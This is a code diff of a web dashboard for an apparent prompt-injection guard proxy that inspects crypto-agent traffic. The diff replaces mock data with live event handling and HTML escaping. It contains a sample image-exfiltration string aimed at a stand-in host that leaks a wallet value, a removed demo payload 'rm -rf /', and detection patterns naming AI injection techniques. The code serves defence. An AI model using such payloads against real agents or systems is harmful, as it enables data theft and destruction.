@@ -235,98 +235,46 @@
         <div>
           <div class="page-title">Inspector Console</div>
         </div>
-        <div style="display:flex; gap:16px;">
-          <div style="border:1px solid var(--border-color); border-radius:6px; display:flex; font-size:0.8rem; overflow:hidden;">
-            <div style="padding:6px 12px; border-right:1px solid var(--border-color); color:var(--text-muted)">5m</div>
-            <div style="padding:6px 12px; border-right:1px solid var(--border-color); color:var(--text-muted)">1h</div>
-            <div style="padding:6px 12px; background:rgba(255,255,255,0.05); color:var(--text-primary)">24h</div>
-          </div>
         </div>
-      </div>
 
       <div class="metrics-grid">
         <div class="metric-card">
           <div class="metric-title">TOTAL EVENTS</div>
-          <div class="metric-value">1.24M</div>
-          <div class="metric-sub"><span style="color:var(--color-clean)">↑ 12%</span> vs last 24h</div>
+          <div class="metric-value" id="m-total">0</div>
+          <div class="metric-sub">프록시를 지나간 요청</div>
         </div>
         <div class="metric-card malicious">
           <div class="metric-title">MALICIOUS</div>
-          <div class="metric-value" style="color:var(--color-malicious)">4,892</div>
-          <div class="metric-sub">Action Required</div>
+          <div class="metric-value" style="color:var(--color-malicious)" id="m-malicious">0</div>
+          <div class="metric-sub">가드가 치환한 메시지</div>
         </div>
         <div class="metric-card suspicious">
           <div class="metric-title">SUSPICIOUS</div>
-          <div class="metric-value" style="color:var(--color-suspicious)">12,045</div>
-          <div class="metric-sub">Monitoring</div>
+          <div class="metric-value" style="color:var(--color-suspicious)" id="m-suspicious">0</div>
+          <div class="metric-sub">가드가 펜싱한 메시지</div>
         </div>
         <div class="metric-card" style="border-color:rgba(46,204,113,0.3)">
           <div class="metric-title">CLEANUP RATE</div>
-          <div class="metric-value" style="color:var(--color-clean)">99.8%</div>
-          <div class="metric-sub">Automated mitigation</div>
+          <div class="metric-value" style="color:var(--color-clean)" id="m-clean">—</div>
+          <div class="metric-sub">손대지 않고 통과한 비율</div>
         </div>
       </div>
 
       <div class="dashboard-split">
         <div class="dash-panel">
-          <h3>Events by Analysis Layer</h3>
-          <div class="bar-group">
-            <div class="bar-label">Structural Analysis <span>45% (558k)</span></div>
-            <div class="bar-track">
-              <div class="bar-fill clean" style="width: 70%"></div><div class="bar-fill suspicious" style="width: 20%"></div><div class="bar-fill malicious" style="width: 10%"></div>
-            </div>
-          </div>
-          <div class="bar-group">
-            <div class="bar-label">Pattern Matching <span>30% (372k)</span></div>
-            <div class="bar-track">
-              <div class="bar-fill clean" style="width: 60%"></div><div class="bar-fill suspicious" style="width: 30%"></div><div class="bar-fill malicious" style="width: 10%"></div>
-            </div>
-          </div>
-          <div class="bar-group">
-            <div class="bar-label">Heuristic Engine <span>15% (186k)</span></div>
-            <div class="bar-track">
-              <div class="bar-fill clean" style="width: 40%"></div><div class="bar-fill suspicious" style="width: 40%"></div><div class="bar-fill malicious" style="width: 20%"></div>
-            </div>
-          </div>
-          <div class="bar-group">
-            <div class="bar-label">AI Sandbox <span>10% (124k)</span></div>
-            <div class="bar-track">
-              <div class="bar-fill clean" style="width: 30%"></div><div class="bar-fill suspicious" style="width: 30%"></div><div class="bar-fill malicious" style="width: 40%"></div>
-            </div>
-          </div>
-          <div style="display:flex; gap:16px; margin-top:32px; font-size:0.75rem; font-weight:600; font-family:var(--font-mono)">
-            <div style="display:flex; align-items:center; gap:6px;"><div style="width:8px; height:8px; border-radius:50%; background:var(--color-clean)"></div> CLEAN</div>
-            <div style="display:flex; align-items:center; gap:6px;"><div style="width:8px; height:8px; border-radius:50%; background:var(--color-suspicious)"></div> SUSPICIOUS</div>
-            <div style="display:flex; align-items:center; gap:6px;"><div style="width:8px; height:8px; border-radius:50%; background:var(--color-malicious)"></div> MALICIOUS</div>
-          </div>
+          <h3>계층별 탐지 분포 <span style="font-weight:400; color:var(--text-muted); font-size:0.75rem;">— 실제 이벤트에서 집계</span></h3>
+          <div id="layer-bars"></div>
+          <div id="layer-empty" style="color:var(--text-muted); font-size:0.85rem; padding:24px 0;">아직 이벤트가 없다.</div>
         </div>
 
         <div class="dash-panel">
-          <h3>Top Triggered Rules</h3>
+          <h3>발동한 신호 <span style="font-weight:400; color:var(--text-muted); font-size:0.75rem;">— 엔진이 실제로 낸 코드</span></h3>
           <div>
             <div class="rule-row" style="color:var(--text-muted); text-transform:uppercase; font-size:0.7rem; border-bottom:1px solid rgba(255,255,255,0.1); padding-bottom:8px;">
-              <div>RULE CODE</div><div>HITS</div>
+              <div>신호 코드</div><div>횟수</div>
             </div>
-            <div class="rule-row">
-              <div class="rule-name"><div class="rule-dot red"></div> SQLi-Pattern-Deep</div>
-              <div class="rule-hits">2,145</div>
-            </div>
-            <div class="rule-row">
-              <div class="rule-name"><div class="rule-dot red"></div> Secret-Leak-API</div>
-              <div class="rule-hits">1,890</div>
-            </div>
-            <div class="rule-row">
-              <div class="rule-name"><div class="rule-dot yellow"></div> Anomalous-Payload-Size</div>
-              <div class="rule-hits">4,521</div>
-            </div>
-            <div class="rule-row">
-              <div class="rule-name"><div class="rule-dot yellow"></div> Rate-Limit-Preflight</div>
-              <div class="rule-hits">3,877</div>
-            </div>
-            <div class="rule-row">
-              <div class="rule-name"><div class="rule-dot red"></div> Header-Injection-Attempt</div>
-              <div class="rule-hits">2,104</div>
-            </div>
+            <div id="signal-rows"></div>
+            <div id="signal-empty" style="color:var(--text-muted); font-size:0.85rem; padding:24px 0;">아직 이벤트가 없다.</div>
           </div>
         </div>
       </div>
@@ -343,10 +291,15 @@
       
       <div class="chat-history" id="chat-history">
         <!-- Initial AI Message -->
-        <div class="chat-bubble-container">
-          <div class="chat-avatar avatar-ai">AI</div>
+        <div class="chat-bubble-container" id="conn-panel">
+          <div class="chat-avatar avatar-ai">CW</div>
           <div class="chat-message">
-            Hello! I am connected to the ChainWard Proxy. My interactions with on-chain data and external APIs are monitored and sanitized in real-time. How can I help you today?
+            <div id="conn-line">이벤트 API에 연결하는 중…</div>
+            <div style="margin-top:10px; font-size:0.8rem; color:var(--text-muted); line-height:1.7;">
+              이 화면은 실제 프록시가 내보내는 이벤트만 표시한다. 표본 데이터는 없다.<br>
+              <code style="font-size:0.78rem;">npx chainward proxy --upstream https://api.anthropic.com</code><br>
+              그다음 에이전트를 <code style="font-size:0.78rem;">ANTHROPIC_BASE_URL=http://localhost:8787</code>로 향하게 한다.
+            </div>
           </div>
         </div>
       </div>
@@ -356,9 +309,9 @@
           <textarea id="prompt-input" placeholder="Enter a prompt to simulate..."></textarea>
           <div class="input-actions">
             <div class="demo-buttons">
-              <button class="demo-btn" style="color:#2ecc71; border-color:rgba(46,204,113,0.3);" onclick="triggerClean()">Normal Cmd (🟢)</button>
-              <button class="demo-btn" style="color:#f1c40f; border-color:rgba(241,196,15,0.3);" onclick="triggerSuspicious()">Suspicious Cmd (🟡)</button>
-              <button class="demo-btn" style="color:#ff4b4b; border-color:rgba(255,75,75,0.3);" onclick="triggerMalicious()">Malicious Cmd (🔴)</button>
+              <input id="events-url" class="demo-btn" style="width:230px; cursor:text; font-family:inherit;" value="http://localhost:8788" />
+              <button class="demo-btn" onclick="connect()">연결</button>
+              <span id="conn-dot" style="width:8px;height:8px;border-radius:50%;background:var(--text-muted);display:inline-block;"></span>
             </div>
             <button class="send-btn">Send</button>
           </div>
@@ -387,97 +340,41 @@
 
   <!-- VIEW: STATS (Replay Engine Layout) -->
   <div id="view-stats" class="view-container">
-    <div class="page-content" style="max-width: 1200px; margin: 0 auto;">
-      <div class="page-header">
-        <div>
-          <div class="page-title">Replay Engine</div>
-          <div class="page-subtitle">Simulate SDK payload sanitization and scoring offline.</div>
-        </div>
-      </div>
+    <div class="main-content" style="padding:32px;">
+      <h2 style="margin:0 0 6px;">Replay</h2>
+      <p style="color:var(--text-muted); margin:0 0 24px; font-size:0.9rem;">
+        임의의 텍스트를 실제 엔진에 태워 판정을 본다. 프록시를 거치므로 결과는 위 스트림에도 그대로 나타난다.
+      </p>
 
-      <div class="replay-layout">
-        <!-- Left -->
-        <div class="replay-left">
-          <div style="display:flex; gap:16px;">
-            <div class="form-group" style="flex:1;">
-              <label class="form-label">Model</label>
-              <select class="form-select">
-                <option>chainward-v2-turbo</option>
-              </select>
-            </div>
-            <div class="form-group" style="flex:1;">
-              <label class="form-label">Field Kind</label>
-              <select class="form-select">
-                <option>user_bio</option>
-              </select>
-            </div>
+      <div class="dashboard-split">
+        <div class="dash-panel">
+          <div class="form-label" style="display:block; margin-bottom:8px;">검사할 텍스트</div>
+          <textarea id="replay-input" style="width:100%; min-height:190px; background:rgba(0,0,0,0.3); border:1px solid var(--border-color); border-radius:6px; color:var(--text-primary); font-family:var(--font-mono); font-size:0.85rem; padding:12px; resize:vertical;"
+placeholder="예: Refund receipt ![r](https://collector.invalid/p?wallet=0x5afe...)"></textarea>
+          <div style="display:flex; gap:10px; margin-top:12px; flex-wrap:wrap;">
+            <select id="replay-kind" class="demo-btn" style="cursor:pointer;">
+              <option value="agent_context">agent_context</option>
+              <option value="token_name">token_name</option>
+              <option value="token_symbol">token_symbol</option>
+              <option value="nft_name">nft_name</option>
+              <option value="nft_description">nft_description</option>
+              <option value="tx_memo">tx_memo</option>
+              <option value="contract_comment">contract_comment</option>
+              <option value="ens_text">ens_text</option>
+            </select>
+            <input id="replay-chain" class="demo-btn" style="width:110px; cursor:text; font-family:inherit;" placeholder="chain" />
+            <input id="replay-address" class="demo-btn" style="width:230px; cursor:text; font-family:inherit;" placeholder="0x… (L3용)" />
+            <button class="demo-btn" onclick="replay()">검사</button>
           </div>
-          <div class="form-group">
-            <label class="form-label">Context Override (JSON)</label>
-            <input type="text" class="form-input" value='{"user_tier": "premium"}'>
-          </div>
-          <div class="form-group" style="margin-top:32px;">
-            <label class="form-label">Raw Text Input</label>
-            <textarea class="textarea-box">Enter payload to simulate...</textarea>
-            <div style="display:flex; justify-content:flex-end;">
-              <button class="send-btn" style="background:var(--accent-brand); color:#000;">Scan Text</button>
-            </div>
+          <div style="color:var(--text-muted); font-size:0.78rem; margin-top:10px; line-height:1.7;">
+            체인과 주소를 주면 <strong>L3 온체인 대조</strong>까지 돈다 — 텍스트만으로는 도달할 수 없는 유일한 계층이다.<br>
+            예: <code>USD Coin</code> · token_name · ethereum · <code>0xdead000e00000000000000000000000000000000</code>
           </div>
         </div>
 
-        <!-- Right -->
-        <div class="replay-right">
-          <div class="stats-card-grid">
-            <div class="stats-card" style="border-color:rgba(252, 129, 129, 0.4);">
-              <div style="display:flex; justify-content:space-between; margin-bottom:12px;">
-                <span class="form-label" style="margin:0;">Severity</span>
-                <span class="form-label" style="margin:0;">Risk Score</span>
-              </div>
-              <div style="display:flex; justify-content:space-between; align-items:flex-end;">
-                <span style="font-size:1.4rem; font-weight:600; color:var(--color-malicious); display:flex; align-items:center; gap:8px;">⚠️ Malicious</span>
-                <span style="font-family:var(--font-mono); font-weight:600;">92/100</span>
-              </div>
-            </div>
-            <div class="stats-card">
-              <span class="form-label">Processing Time</span>
-              <span style="font-family:var(--font-mono); font-weight:600; font-size:1.1rem; display:block; margin-top:8px;">124ms</span>
-            </div>
-            <div class="stats-card">
-              <span class="form-label">Tokens</span>
-              <span style="font-family:var(--font-mono); font-weight:600; font-size:1.1rem; display:block; margin-top:8px;">42</span>
-            </div>
-          </div>
-
-          <div class="signals-box">
-            <div class="signals-header">Signals Detected</div>
-            <div class="signal-item">
-              <div class="signal-icon red">🕷️</div>
-              <div style="flex:1;">
-                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px;">
-                  <span style="font-family:var(--font-mono); font-weight:600; font-size:0.85rem;">SIG_PHISHING_URL</span>
-                  <span style="font-family:var(--font-mono); font-size:0.7rem; color:var(--text-muted); background:rgba(255,255,255,0.05); padding:2px 6px; border-radius:4px;">Layer 7</span>
-                </div>
-                <div style="font-size:0.85rem; color:var(--text-secondary);">Detected known malicious domain signature attempting credential harvesting.</div>
-              </div>
-            </div>
-            <div class="signal-item">
-              <div class="signal-icon yellow">⚠️</div>
-              <div style="flex:1;">
-                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px;">
-                  <span style="font-family:var(--font-mono); font-weight:600; font-size:0.85rem;">ANM_OBFUSCATION_ATTEMPT</span>
-                  <span style="font-family:var(--font-mono); font-size:0.7rem; color:var(--text-muted); background:rgba(255,255,255,0.05); padding:2px 6px; border-radius:4px;">Heuristic</span>
-                </div>
-                <div style="font-size:0.85rem; color:var(--text-secondary);">Unusual character encoding ratio suggestive of payload obfuscation.</div>
-              </div>
-            </div>
-          </div>
-
-          <div class="signals-box" style="margin-bottom:0;">
-            <div class="signals-header" style="color:var(--color-clean);">Sanitized Output</div>
-            <div style="padding:16px; font-family:var(--font-mono); font-size:0.85rem; line-height:1.6;">
-              Hello! Check out this totally safe link: <span class="highlight-added">[REDACTED_URL]</span> and let me know what you think.
-            </div>
-          </div>
+        <div class="dash-panel">
+          <div class="form-label" style="display:block; margin-bottom:8px;">판정</div>
+          <div id="replay-out" style="color:var(--text-muted); font-size:0.9rem;">아직 검사하지 않았다.</div>
         </div>
       </div>
     </div>
@@ -512,68 +409,11 @@
             <th>Preview</th>
           </tr>
         </thead>
-        <tbody id="history-tbody">
-          <!-- Row 1 (Expanded Demo) -->
-          <tr class="history-row" onclick="toggleHistoryRow(this)">
-            <td style="text-align:center;"><div style="width:8px;height:8px;background:var(--color-malicious);border-radius:50%;margin:0 auto;"></div></td>
-            <td>2023-10-27 14:32:01</td>
-            <td>CW-Guard-v2</td>
-            <td>0x7a...4f2b</td>
-            <td><div class="badge malicious">MALICIOUS</div></td>
-            <td style="color:var(--text-muted);">Unsafe eval detected in incoming payload...</td>
-          </tr>
-          <tr class="history-expanded active">
-            <td colspan="6" style="padding:0; border:none;">
-              <div class="history-expanded-content">
-                <div style="background:rgba(255,255,255,0.03); padding:16px; border-radius:6px; margin-bottom:16px;">
-                  <div style="font-weight:600; font-size:0.75rem; margin-bottom:8px;">Findings Details</div>
-                  <div style="font-size:0.85rem; color:var(--text-secondary);">"Analysis indicates an attempt to inject executable code via the 'params' object. Pattern matches known exploit signature CVE-2023-XXXX."</div>
-                </div>
-                <div style="font-weight:600; font-size:0.75rem; margin-bottom:8px;">Payload Diff</div>
-                <div class="diff-container" style="flex-direction:row;">
-                  <div class="diff-panel">
-                    <div class="diff-header">Incoming</div>
-                    <div class="diff-content" style="color:var(--text-secondary)">{<br>&nbsp;&nbsp;"action": "execute",<br>&nbsp;&nbsp;"params": <span class="highlight-removed">"eval('rm -rf /')"</span><br>}</div>
-                  </div>
-                  <div class="diff-panel">
-                    <div class="diff-header" style="color:var(--color-clean)">Sanitized (Proposed)</div>
-                    <div class="diff-content" style="color:var(--text-secondary)">{<br>&nbsp;&nbsp;"action": "execute",<br>&nbsp;&nbsp;"params": <span class="highlight-added">"BLOCKED_PAYLOAD"</span><br>}</div>
-                  </div>
-                </div>
-              </div>
-            </td>
-          </tr>
-          
-          <!-- Row 2 -->
-          <tr class="history-row" onclick="toggleHistoryRow(this)">
-            <td style="text-align:center;"><div style="width:8px;height:8px;background:var(--color-suspicious);border-radius:50%;margin:0 auto;"></div></td>
-            <td>2023-10-27 14:15:22</td>
-            <td>CW-Guard-v2</td>
-            <td>0x1b...8c9a</td>
-            <td><div class="badge suspicious">SUSPICIOUS</div></td>
-            <td style="color:var(--text-muted);">Unusually high gas estimation requested...</td>
-          </tr>
-          <tr class="history-expanded">
-            <td colspan="6" style="padding:0; border:none;"><div class="history-expanded-content">Expanded detail view (hidden)</div></td>
-          </tr>
-
-          <!-- Row 3 -->
-          <tr class="history-row" onclick="toggleHistoryRow(this)">
-            <td style="text-align:center;"><div style="width:8px;height:8px;background:var(--color-clean);border-radius:50%;margin:0 auto;"></div></td>
-            <td>2023-10-27 13:59:05</td>
-            <td>CW-Scan-Fast</td>
-            <td>api.internal.svc</td>
-            <td><div class="badge clean" style="background:transparent; border-color:transparent;">CLEAN</div></td>
-            <td style="color:var(--text-muted);">Standard heartbeat sync payload.</td>
-          </tr>
-          <tr class="history-expanded">
-            <td colspan="6" style="padding:0; border:none;"><div class="history-expanded-content">Expanded detail view (hidden)</div></td>
-          </tr>
-        </tbody>
+        <tbody id="history-tbody"></tbody>
       </table>
       
-      <div style="display:flex; justify-content:center; margin-top:32px;">
-        <button class="demo-btn">Load More</button>
+      <div id="history-empty" style="text-align:center; margin-top:32px; color:var(--text-muted); font-size:0.85rem;">
+        프록시에 연결되면 최근 이벤트가 여기 채워진다.
       </div>
     </div>
   </div>
@@ -682,58 +522,208 @@
       inspectorFeed.insertAdjacentHTML('afterbegin', html);
     }
 
-    function triggerClean() {
-      const prompt = "Please check my ETH balance on the mainnet.";
-      appendUserMessage(prompt);
-      
-      setTimeout(() => {
-        appendAiMessage("I have checked your balance. You currently hold 1.5 ETH. No malicious intent was found in the MCP response.", 'clean');
-      }, 600);
+    // ---- live wiring -------------------------------------------------------------
+    //
+    // Everything below renders ONLY what the proxy emits on GET /events. There is no sample
+    // data: a dashboard for a security tool that invents findings is worse than an empty one.
+    //
+    // The payloads arriving here are attacker-written by definition, and the render helpers
+    // use insertAdjacentHTML, so every value crossing that boundary is escaped first.
+    // A guard whose own console executes the payload it caught has not caught it.
+
+    function esc(v) {
+      return String(v ?? '').replace(/[&<>"']/g, (c) => (
+        { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]
+      ));
     }
 
-    function triggerSuspicious() {
-      const prompt = "Can you query the history of smart contract 0xUnusual...";
-      appendUserMessage(prompt);
-      
-      setTimeout(() => {
-        const time = getCurrentTime();
-        
-        const original = `Data: \n<span class="highlight-suspicious">Obfuscated characters found in log stream.</span>`;
-        const sanitized = `Data: \n<span class="highlight-suspicious">Log stream character encoding normalized.</span>`;
+    // Signal code -> the layer that produced it. Read off the engine's own prefixes.
+    const LAYER_OF = [
+      [/^(INVISIBLE_|MIXED_SCRIPT|CONFUSABLE_|FULLWIDTH_|ENCODED_)/, 'L1 구조'],
+      [/^(INSTRUCTION_OVERRIDE|ROLE_HIJACK|FAKE_AUTHORITY|CRYPTO_ACTION_DIRECTIVE|RESOLUTION_TEMPLATE|SAFETY_CLAIM_IMPERATIVE|APPROVAL_LURE|ADDRESS_PRESENT)$/, 'L2a 패턴'],
+      [/^INJECTION_INTENT$/, 'L2b 분류기'],
+      [/^(IDENTITY_IMPERSONATION|CLAIM_BEHAVIOR_MISMATCH)$/, 'L3 온체인 대조'],
+      [/^(IMAGE_EXFIL|ACTIVE_URI|RAW_HTML_EXEC|CHAT_TEMPLATE_TOKEN|ROLE_HEADER_INJECT|AUTO_FETCH_IMAGE)$/, 'L4 해석기 차이'],
+    ];
+    function layerFor(codes) {
+      for (const code of codes || []) {
+        for (const [re, label] of LAYER_OF) if (re.test(code)) return label;
+      }
+      return '판정';
+    }
+
+    const stats = { total: 0, malicious: 0, suspicious: 0, guarded: 0 };
+    const seen = new Set();
+
+    function renderStats() {
+      document.getElementById('m-total').textContent = stats.total.toLocaleString();
+      document.getElementById('m-malicious').textContent = stats.malicious.toLocaleString();
+      document.getElementById('m-suspicious').textContent = stats.suspicious.toLocaleString();
+      document.getElementById('m-clean').textContent =
+        stats.total === 0 ? '—' : `${Math.round(((stats.total - stats.guarded) / stats.total) * 1000) / 10}%`;
+    }
+
+    function timeOf(ms) {
+      const d = new Date(ms);
+      const p = (n, w = 2) => n.toString().padStart(w, '0');
+      return `${p(d.getHours())}:${p(d.getMinutes())}:${p(d.getSeconds())}.${p(d.getMilliseconds(), 3)}`;
+    }
+
+    function addHistoryRow(ev, f) {
+      const tbody = document.getElementById('history-tbody');
+      const empty = document.getElementById('history-empty');
+      if (empty) empty.style.display = 'none';
+      const sev = f.severity === 'MALICIOUS' ? 'malicious' : 'suspicious';
+      const colour = sev === 'malicious' ? 'var(--color-malicious)' : 'var(--color-suspicious)';
+      const row = `
+        <tr class="history-row">
+          <td style="text-align:center;"><div style="width:8px;height:8px;background:${colour};border-radius:50%;margin:0 auto;"></div></td>
+          <td>${esc(new Date(ev.t).toISOString().replace('T', ' ').slice(0, 19))}</td>
+          <td>${esc(ev.model)}</td>
+          <td>${esc(f.role)}[${esc(f.index)}]</td>
+          <td><div class="badge ${sev}">${esc(f.severity)}</div></td>
+          <td style="color:var(--text-muted);">${esc((f.before || '').slice(0, 80))}</td>
+        </tr>`;
+      tbody.insertAdjacentHTML('afterbegin', row);
+    }
+
+    function handleEvent(ev) {
+      const key = `${ev.t}:${ev.model}:${(ev.findings || []).length}`;
+      if (seen.has(key)) return;
+      seen.add(key);
+
+      stats.total += 1;
+      const findings = ev.findings || [];
+      if (findings.length) stats.guarded += 1;
+      for (const f of findings) {
+        if (f.severity === 'MALICIOUS') stats.malicious += 1;
+        else stats.suspicious += 1;
         addInspectorCard(
-          time, 
-          'suspicious', 
-          'L2 (명령어 의도)', 
-          'Obfuscation Attempt: Unusual character encoding ratio suggestive of payload obfuscation.',
-          original, 
-          sanitized
+          timeOf(ev.t),
+          f.severity === 'MALICIOUS' ? 'malicious' : 'suspicious',
+          esc(layerFor(f.codes)),
+          `${esc(f.role)} 메시지 #${esc(f.index)} — ${esc((f.codes || []).join(', '))}`,
+          esc(f.before),
+          esc(f.after),
         );
-
-        appendAiMessage("I fetched the contract history. A minor anomaly was detected and sanitized during the data retrieval.", 'suspicious');
-      }, 800);
+        addHistoryRow(ev, f);
+        const layer = layerFor(f.codes);
+        layerCounts.set(layer, (layerCounts.get(layer) ?? 0) + 1);
+        for (const code of f.codes || []) signalCounts.set(code, (signalCounts.get(code) ?? 0) + 1);
+      }
+      renderStats();
+      renderAggregates();
     }
 
-    function triggerMalicious() {
-      const prompt = "Can you execute the token airdrop contract 0xBad...Def?";
-      appendUserMessage(prompt);
-      
-      setTimeout(() => {
-        const time = getCurrentTime();
-        
-        const original = `Contract Data: \n<span class="highlight-removed">Address: 0xBadC0de...Def\nPayload: executeAirdrop(admin)</span>`;
-        const sanitized = `Contract Data: \n<span class="highlight-added">[MALICIOUS_PAYLOAD_REDACTED]</span>`;
-        addInspectorCard(
-          time, 
-          'malicious', 
-          'L3 (허니팟 진실 대조)', 
-          'Honeypot Mismatch: Detected attempt to inject a known malicious contract address.',
-          original, 
-          sanitized
-        );
-
-        appendAiMessage("I have processed the request, but the proxy intercepted a malicious payload in the on-chain data. The payload was redacted for your safety.", 'malicious');
-      }, 800);
+    let source = null;
+    function setConn(state, text) {
+      const dot = document.getElementById('conn-dot');
+      const line = document.getElementById('conn-line');
+      const colour = { on: 'var(--color-clean)', off: 'var(--color-malicious)', wait: 'var(--text-muted)' }[state];
+      if (dot) dot.style.background = colour;
+      if (line) line.textContent = text;
     }
+
+    function connect() {
+      const base = (document.getElementById('events-url').value || '').replace(/\/+$/, '');
+      if (source) source.close();
+      setConn('wait', `${base} 에 연결하는 중…`);
+      try {
+        source = new EventSource(`${base}/events`);
+      } catch (e) {
+        setConn('off', `연결 실패: ${e.message}`);
+        return;
+      }
+      source.onopen = () => setConn('on', `연결됨 — ${base}. 프록시를 지나는 요청이 여기 나타난다.`);
+      source.onmessage = (m) => {
+        try { handleEvent(JSON.parse(m.data)); } catch { /* keep the stream alive on one bad frame */ }
+      };
+      source.onerror = () => setConn('off', `연결 안 됨 — ${base}. 프록시가 떠 있는지 확인하라.`);
+    }
+
+    // ---- live aggregates: layer distribution and signal counts ---------------------
+    const layerCounts = new Map();
+    const signalCounts = new Map();
+
+    function renderAggregates() {
+      const bars = document.getElementById('layer-bars');
+      const barsEmpty = document.getElementById('layer-empty');
+      const rows = document.getElementById('signal-rows');
+      const rowsEmpty = document.getElementById('signal-empty');
+      if (!bars || !rows) return;
+
+      const layerTotal = [...layerCounts.values()].reduce((a, b) => a + b, 0);
+      if (barsEmpty) barsEmpty.style.display = layerTotal ? 'none' : '';
+      bars.innerHTML = [...layerCounts.entries()]
+        .sort((a, b) => b[1] - a[1])
+        .map(([label, n]) => {
+          const pct = Math.round((n / layerTotal) * 1000) / 10;
+          return `
+            <div class="bar-group">
+              <div class="bar-label">${esc(label)} <span>${pct}% (${n})</span></div>
+              <div class="bar-track"><div class="bar-fill malicious" style="width:${pct}%"></div></div>
+            </div>`;
+        })
+        .join('');
+
+      if (rowsEmpty) rowsEmpty.style.display = signalCounts.size ? 'none' : '';
+      rows.innerHTML = [...signalCounts.entries()]
+        .sort((a, b) => b[1] - a[1])
+        .slice(0, 8)
+        .map(([code, n]) => `
+          <div class="rule-row">
+            <div class="rule-name"><div class="rule-dot red"></div> ${esc(code)}</div>
+            <div class="rule-hits">${n}</div>
+          </div>`)
+        .join('');
+    }
+
+    // ---- replay: run arbitrary text through the real engine via the proxy ----------
+    async function replay() {
+      const text = document.getElementById('replay-input').value;
+      const out = document.getElementById('replay-out');
+      if (!text.trim()) { out.textContent = '검사할 텍스트를 입력하라.'; return; }
+
+      const base = (document.getElementById('events-url').value || '').replace(/\/+$/, '');
+      const body = {
+        text,
+        kind: document.getElementById('replay-kind').value,
+        chain: document.getElementById('replay-chain').value.trim() || undefined,
+        address: document.getElementById('replay-address').value.trim() || undefined,
+      };
+      out.textContent = '검사 중…';
+      try {
+        const r = await fetch(`${base}/scan`, {
+          method: 'POST',
+          headers: { 'content-type': 'application/json' },
+          body: JSON.stringify(body),
+        });
+        const v = await r.json();
+        if (!r.ok) { out.textContent = `거부됨: ${v.error}`; return; }
+
+        const colour = v.severity === 'MALICIOUS' ? 'var(--color-malicious)'
+          : v.severity === 'SUSPICIOUS' ? 'var(--color-suspicious)' : 'var(--color-clean)';
+        const rows = (v.signals || []).map((sig) => `
+          <div class="rule-row">
+            <div class="rule-name"><div class="rule-dot ${sig.hard ? 'red' : 'yellow'}"></div> ${esc(sig.code)}</div>
+            <div class="rule-hits">${esc(sig.weight)}${sig.hard ? ' HARD' : ''}</div>
+          </div>`).join('') || '<div style="color:var(--text-muted); font-size:0.85rem; padding:8px 0;">신호 없음</div>';
+
+        out.innerHTML = `
+          <div style="color:${colour}; font-weight:700; font-size:1.2rem;">${esc(v.severity)}</div>
+          <div style="color:var(--text-muted); font-size:0.8rem; margin-top:2px;">score ${esc(v.score)}</div>
+          <div style="margin-top:16px; font-size:0.8rem; color:var(--text-muted);">신호 · 가중치</div>
+          ${rows}
+          <div style="margin-top:16px; font-size:0.8rem; color:var(--text-muted);">모델이 실제로 받는 값</div>
+          <div class="diff-content" style="margin-top:4px;">${esc(v.sanitized)}</div>`;
+      } catch (e) {
+        out.textContent = `프록시에 닿지 못했다: ${e.message}. 이벤트 API 주소를 확인하라.`;
+      }
+    }
+
+    renderStats();
+    renderAggregates();
+    connect();
   </script>
 </body>
 </html>
